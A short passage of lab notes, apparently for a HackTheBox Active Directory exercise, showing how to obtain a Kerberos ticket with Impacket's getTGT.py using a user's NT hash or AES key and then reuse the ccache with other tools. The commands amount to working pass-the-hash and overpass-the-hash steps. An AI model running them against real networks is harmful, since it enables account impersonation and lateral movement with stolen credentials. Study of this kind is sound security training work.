
 
 Request a TGT from the KDC using Impacket’s  getTGT.py`

`getTGT.py` can request a TGT if you supply a password, NTLM hash, or AES key. It will save a `*.ccache` file you can export into `KRB5CCNAME`.
```
# example path — adjust to where impacket examples are on your box
python3 /path/to/impacket/examples/getTGT.py \
  -hashes :a738f92b3c08b424ec2d99589a9cce60 \
  INLANEFREIGHT.HTB/carlos \
  -dc-ip <DC_IP>

```
Notes:

- `-hashes LM:NThash` — we pass `:NT` when there's no LM hash.
    
- `INLANEFREIGHT.HTB/carlos` is the identity string (domain/principal).
    
- `-dc-ip` is optional but often useful in CTFs to point at the KDC/DC.
#### Using an AES key (preferred if the KDC requires AES)
```
python3 /path/to/impacket/examples/getTGT.py \
  -aesKey 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f \
  INLANEFREIGHT.HTB/carlos \
  -dc-ip <DC_IP>

```
2) Use the generated ccache with tools
```
export KRB5CCNAME=carlos.ccache
```
run tools with
```
KRB5CCNAME=ticketpath -k -no-pass
```
